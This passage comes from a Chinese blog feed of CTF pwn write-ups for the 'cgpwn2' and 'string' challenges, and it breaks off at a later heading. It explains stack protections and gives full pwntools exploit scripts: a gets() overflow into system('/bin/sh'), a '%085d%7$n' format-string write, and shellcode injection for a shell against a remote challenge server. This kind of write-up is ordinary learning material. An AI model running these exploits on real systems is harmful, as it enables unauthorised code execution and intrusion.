= &amp;s;<span class="comment">//我们可以看到if判断上面的这些其实对我们没有影响，不用去分析这些！</span></span><br><span class="line">  v1 = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;s &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = <span class="number">0</span>;</span><br><span class="line">    v0 = (<span class="keyword">char</span> *)&amp;v6;</span><br><span class="line">    v1 = <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; <span class="number">0xFFFFFFFC</span>) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please tell me your name"</span>);             <span class="comment">// 交互   1</span></span><br><span class="line">  fgets(name, <span class="number">50</span>, <span class="built_in">stdin</span>);                       <span class="comment">// 输入name    最大50字节</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hello,you can leave some message here:"</span>);<span class="comment">// 交互    2   输入message   </span></span><br><span class="line">  <span class="keyword">return</span> gets(&amp;s);                              <span class="comment">// gets()危险函数， &amp;s在栈上的空间是 0x26   存在栈溢出漏洞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析：这个程序里面没有-bin-sh，但在hello函数中，name是一个全局变量，我们将”-bin-sh”传入到name中，那么”-bin-sh”的地址就是name的地址。然后调用system函数去调用就可以了。"><a href="#分析：这个程序里面没有-bin-sh，但在hello函数中，name是一个全局变量，我们将”-bin-sh”传入到name中，那么”-bin-sh”的地址就是name的地址。然后调用system函数去调用就可以了。" class="headerlink" title="分析：这个程序里面没有/bin/sh，但在hello函数中，name是一个全局变量，我们将”/bin/sh”传入到name中，那么”/bin/sh”的地址就是name的地址。然后调用system函数去调用就可以了。"></a>分析：这个程序里面没有/bin/sh，但在hello函数中，name是一个全局变量，我们将”/bin/sh”传入到name中，那么”/bin/sh”的地址就是name的地址。然后调用system函数去调用就可以了。</h2><blockquote><p>先用0x26个字符填充  s所在的栈，然后4个字符覆盖ebp，system()函数地址（四个字节）覆盖原返回地址，再4个字符覆盖返回地址（随便写就好） ，再4个字节覆盖参数即（/sh/bin 的指针）</p></blockquote><h2 id="构造exp："><a href="#构造exp：" class="headerlink" title="构造exp："></a>构造exp：</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level='debug'</span><br><span class="line"><span class="comment">#conn=process('./cgpwn2')</span></span><br><span class="line">conn=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"52455"</span>)</span><br><span class="line">elf=ELF('./cgpwn2')</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">"please tell me your name"</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#\xhh表示二位十六进制</span></span><br><span class="line">name_addr=0x0804A080<span class="comment">#name的在bss段上的地址</span></span><br><span class="line"><span class="comment">#sys_addr=0x08048420#</span></span><br><span class="line"><span class="comment">#我们在ida中函数栏双击system函数跳转它在plt表中的位置：</span></span><br><span class="line"><span class="comment">#.plt:08048420                 jmp     ds:off_804A01C</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr=elf.symbols['system']</span><br><span class="line"><span class="comment">#ELF模块的symbols[]用来取得函数在内存中的地址，推荐用这个！</span></span><br><span class="line">payload=<span class="string">"A"</span>*(0x26+0x4)+p32(sys_addr)+<span class="string">"A"</span>*4+p32(name_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">"here"</span>,payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br><span class="line">conn.recvall()<span class="comment">#cyberpeace&#123;59e9622c1182d55ae83f0ad00d6dab00&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/11/u7hYOH.png" alt="u7hYOH.png"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">学习进度太慢，真的太慢了，应该说是学习效率不高，这个自律，有点麻烦啊！</span><br><span class="line">严格的自律就是自由！</span><br><span class="line">嗯嗯，</span><br><span class="line">我想要自由！</span><br><span class="line">我要严格自律！</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/13/nDgRiT.gif" alt="nDgRiT.gif"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新手区的pwn题还没有做完！明天要做完它！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn03</title>
    <link href="http://yoursite.com/2019/10/08/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn03/"/>
    <id>http://yoursite.com/2019/10/08/国庆七天之pwn03/</id>
    <published>2019-10-08T15:46:23.000Z</published>
    <updated>2019-10-09T15:47:44.793Z</updated>
    
    <content type="html"><![CDATA[<p>真难！</p><a id="more"></a><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><h3 id="Canary-保护（栈保护）："><a href="#Canary-保护（栈保护）：" class="headerlink" title="Canary 保护（栈保护）："></a>Canary 保护（栈保护）：</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当函数存在缓冲区溢出攻击漏洞时，</span><br><span class="line">这时攻击者可以通过覆盖栈上的返回地址来让<span class="keyword">shellcode能得到执行。</span></span><br><span class="line"><span class="keyword">但是当我们来开启了 </span>Canary（栈）保护，函数在开始执行的时候就先会往栈里插入 cookie信息，</span><br><span class="line">当函数真正返回的时候会验证cookile信息是否合法，如果不合法就停止运行。</span><br><span class="line">所以，当开启这个Canary保护后，攻击者再通过以上方法就会导致<span class="keyword">shellcode不能执行。</span></span><br></pre></td></tr></table></figure><h3 id="NX（No-eXecute）保护："><a href="#NX（No-eXecute）保护：" class="headerlink" title="NX（No-eXecute）保护："></a>NX（No-eXecute）保护：</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">它的保护原理是： 将数据所在内存页标识为不可执行，当程序溢出成功开始要执行 <span class="keyword">shellcode时，</span></span><br><span class="line"><span class="keyword">程序会尝试再数据页面上执行指令，但当我们开启了这个保护（数据页面已经被标识为不可执行），</span></span><br><span class="line"><span class="keyword">CPU就会 </span> 抛出异常，而不是去执行恶意指令</span><br></pre></td></tr></table></figure><h3 id="PIE（地址空间分布随机化）保护："><a href="#PIE（地址空间分布随机化）保护：" class="headerlink" title="PIE（地址空间分布随机化）保护："></a>PIE（地址空间分布随机化）保护：</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">它有三个强度：</span><br><span class="line"><span class="number">0</span>：没有开启进程地址空间随机化</span><br><span class="line"><span class="number">1</span>：表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line"><span class="number">2</span>：在 <span class="number">1</span> 的基础上增加  heap(堆)的随机化</span><br><span class="line"></span><br><span class="line">可以防范基于Ret2libc方式的针对DEP的攻击。</span><br><span class="line">ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</span><br></pre></td></tr></table></figure><h3 id="RELRO保护："><a href="#RELRO保护：" class="headerlink" title="RELRO保护："></a>RELRO保护：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RELRO为” PartialRELRO”时，说明我们对GOT表具有写权限。</span><br></pre></td></tr></table></figure><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><h2 id="检查文件属性及其保护："><a href="#检查文件属性及其保护：" class="headerlink" title="检查文件属性及其保护："></a>检查文件属性及其保护：</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yangmutou<span class="meta">@yangmutou</span>-virtual-<span class="string">machine:</span><span class="regexp">~/下载$ checksec ./</span>string</span><br><span class="line">[*] <span class="string">'/home/yangmutou/\xe4\xb8\x8b\xe8\xbd\xbd/string'</span></span><br><span class="line"><span class="symbol">    Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">    RELRO:</span>    Full RELRO</span><br><span class="line"><span class="symbol">    Stack:</span>    Canary found  <span class="comment">//栈不可执行</span></span><br><span class="line"><span class="symbol">    NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">    PIE:</span>      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">yangmutou<span class="meta">@yangmutou</span>-virtual-<span class="string">machine:</span>~/下载$</span><br></pre></td></tr></table></figure><h2 id="主函数："><a href="#主函数：" class="headerlink" title="主函数："></a>主函数：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400D72</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What should your character's name be:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, &amp;s);                      <span class="comment">// 交互    1</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) &lt;= <span class="number">0xC</span> )                      <span class="comment">// 创建   &lt;=12 个 字符的 角色名字</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Creating a new player."</span>);</span><br><span class="line">    sub_400A7D();                               <span class="comment">// 进入        sub_400A7D()  函数</span></span><br><span class="line">    sub_400BB9();                               <span class="comment">// 输入east后 进入 sub_400BB9()函数</span></span><br><span class="line">    sub_400CA6((_DWORD *)a1);                   <span class="comment">// 输入 一个  整型  数  和 一个字符串后 来到 sub_400CA6(v3[0]) 函数</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hei! What's up!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sub-400A7D-函数："><a href="#sub-400A7D-函数：" class="headerlink" title="sub_400A7D()函数："></a>sub_400A7D()函数：</h2><blockquote><p>这个函数其实没有做什么，当我们输入east  就绕过了所有判断，进入下一个函数sub_400BB9()</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_400A7D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" This is a famous but quite unusual inn. The air is fresh and the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"marble-tiled ground is clean. Few rowdy guests can be seen, and the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"furniture looks undamaged by brawls, which are very common in other pubs"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"all around the world. The decoration looks extremely valuable and would fit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"into a palace, but in this city it's quite ordinary. In the middle of the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"room are velvet covered chairs and benches, which surround large oaken"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tables. A large sign is fixed to the northern wall behind a wooden bar. In"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"one corner you notice a fireplace."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There are two obvious exits: east, up."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But strange thing is ,no one there."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"So, where you will go?east or up?:"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                             <span class="comment">// 交互  2   （只能选east） 然后 就出去这个函数了</span></span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) || !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hei! I'm secious!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"So, where you will go?:"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"up"</span>) )</span><br><span class="line">      sub_4009DD(&amp;s1, <span class="string">"up"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"YOU KNOW WHAT YOU DO?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进入sub-400BB9-函数："><a href="#进入sub-400BB9-函数：" class="headerlink" title="进入sub_400BB9()函数："></a>进入sub_400BB9()函数：</h2><blockquote><p>输入   1   然后我们利用格式化字符串漏洞，将v3[0]的内容变为  85</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_400BB9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span>);<span class="comment">// 走了会  回到 原路   </span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">", what happend?! You just travel , and find another hole"</span>);<span class="comment">// 然后 有个 新的洞，   肯定进去啊 不然也一直绕吗！</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"go into there(1), or leave(0)?:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);                     <span class="comment">// 交互三      输入    1</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"A voice heard in your mind"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"'Give me an address'"</span>);               <span class="comment">// 给我一个   地址</span></span><br><span class="line">    _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v2);                  <span class="comment">// 交互4   输入 v2  </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And, you wish is:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;format);               <span class="comment">// 交互  5  输入  一个字符串 %085d%7$n</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your wish is"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, &amp;format);                   <span class="comment">// 这里有个 格式化  漏洞！</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I hear it, I hear it...."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sub-400CA6-DWORD-a1-函数："><a href="#sub-400CA6-DWORD-a1-函数：" class="headerlink" title="sub_400CA6((_DWORD *)a1)函数："></a>sub_400CA6((_DWORD *)a1)函数：</h2><blockquote><p>通过使得v3[0]==v3[1]==85   可通过下面sub_400CA6（）函数的判断，执行 read(0, v1, 0x100uLL); 这里看注释就好！ </p></blockquote><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400CA6(<span class="name">_DWORD</span> *a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1<span class="comment">; // rsi</span></span><br><span class="line">  unsigned __int64 v3<span class="comment">; // [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0</span>x28u)<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span>)<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"Dragon say: HaHa! you were supposed to have a normal"</span>)<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"RPG game, but I have changed it! you have no weapon and "</span>)<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"skill! you could not defeat me !"</span>)<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"That's sound terrible! you meet final boss!but you level is ONE!"</span>)<span class="comment">;</span></span><br><span class="line">  if ( <span class="name">*a1</span> == a1[<span class="number">1</span>] )                           // 于是 我们的 目的  就是使：v3[<span class="number">0</span>]==v3[<span class="number">1</span>]</span><br><span class="line">  &#123;                                                 //</span><br><span class="line">    puts(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>)<span class="comment">;</span></span><br><span class="line">    v1 = mmap(<span class="number">0</span>LL, <span class="number">0</span>x1000uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>LL)<span class="comment">;  // v1  为申请  一个 可rwx的 1000空间 首地址</span></span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">0</span>x100uLL)<span class="comment">;                      // 最大可读取  100 个字符</span></span><br><span class="line">    ((<span class="name">void</span> (<span class="name">__fastcall</span> *)(_QWORD, void *))v1)(<span class="number">0</span>LL, v1)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(<span class="number">0</span>x28u) ^ v3<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wp</span>:     http://virgin-forest.top/2019/05/16/ctf-nuaactf-string/</span><br><span class="line"></span><br><span class="line"><span class="attribute">wp</span>:     https://github.com/susers/Writeups/blob/master/2017/NUAACTF/pwn/string/Writeup.md</span><br><span class="line"></span><br><span class="line"><span class="attribute">pwntools</span>:     https://bbs.pediy.com/thread-247217.htm</span><br></pre></td></tr></table></figure><h2 id="测出偏移位："><a href="#测出偏移位：" class="headerlink" title="测出偏移位："></a>测出偏移位：</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">"./string"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"secret[0] is"</span>)</span><br><span class="line">addr = <span class="keyword">int</span>(p.recvuntil(<span class="string">"\n"</span>).strip(),<span class="number">16</span>)        <span class="comment">#取v3[0]的地址</span></span><br><span class="line">p.recvuntil(<span class="string">"What should your character's name be:"</span>)</span><br><span class="line">p.sendline(<span class="string">"AAAA"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"?east or up?:"</span>)</span><br><span class="line">p.sendline(<span class="string">"east"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"or leave(0)?:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"an address'"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">"And, you wish is:"</span>)</span><br><span class="line">payload = <span class="string">"AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"</span> //可得到第七个%x对应 的是<span class="number">41414141</span>  即偏移量是<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span>(addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="n-x"><a href="#n-x" class="headerlink" title="%n$x"></a>%n$x</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表示的是【把第n个参数输出来】。因为我们的整数本身也不一定是正好放在format参数的后面，而且这里的程序是64bit的，64bit传入参数的时候，之前的参数的会放在寄存器中，多余的参数才会放到栈上，传参的顺序为【<span class="built_in">rdi</span>,<span class="built_in">rsi</span>,<span class="built_in">rdx</span>,<span class="built_in">rcx</span>,<span class="built_in">r8</span>,<span class="built_in">r9</span>，栈】。</span><br></pre></td></tr></table></figure><p>呃呃呃，不行，思绪太乱了！唉！</p><h2 id="085d-7-n"><a href="#085d-7-n" class="headerlink" title="%085d%7$n"></a>%085d%7$n</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将%n之前已经输出  <span class="number">85</span>宽度（即相当于<span class="number">85</span>字节），于是将<span class="number">85</span>写道（作为）偏移量为<span class="number">7</span>  的地址对应的内容！</span><br></pre></td></tr></table></figure><h2 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a>构造payload：</h2><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="symbol">#conn</span> = process(<span class="comment">"./string"</span>)</span><br><span class="line">conn = remote(<span class="comment">"111.198.29.45"</span>,<span class="comment">"41098"</span>)</span><br><span class="line">conn.recvuntil(<span class="comment">"secret[0] is"</span>)</span><br><span class="line">addr = int(conn.recvuntil(<span class="comment">"\n"</span>).strip(),<span class="number">16</span>)</span><br><span class="line">conn.recvuntil(<span class="comment">"What should your character's name be:"</span>)</span><br><span class="line">conn.sendline(<span class="comment">"AAAA"</span>)</span><br><span class="line">conn.recvuntil(<span class="comment">"?east or up?:"</span>)</span><br><span class="line">conn.sendline(<span class="comment">"east"</span>)</span><br><span class="line">conn.recvuntil(<span class="comment">"or leave(0)?:"</span>)</span><br><span class="line">conn.sendline(<span class="comment">"1"</span>)</span><br><span class="line">conn.recvuntil(<span class="comment">"an address'"</span>)</span><br><span class="line">conn.sendline(str(addr))</span><br><span class="line">conn.recvuntil(<span class="comment">"And, you wish is:"</span>)</span><br><span class="line">payload = <span class="comment">"%085d%7$n"</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.recvuntil(<span class="comment">"I will help you! USE YOU SPELL"</span>)</span><br><span class="line">conn.sendline(asm(shellcraft.amd64.linux.sh(), arch=<span class="string">'amd64'</span>))</span><br><span class="line">conn.interactive()      <span class="symbol">#cyberpeace</span>&#123;<span class="number">5450</span>ea982596245eb4f6daebf413b4d9&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#在python的pwntools库中可以用 asm(shellcraft.amd64.linux.sh(), arch=’amd64’) 生成shellcode</span><br></pre></td></tr></table></figure><h1 id="guess-num"><a href="#guess-num" class="headerlink" 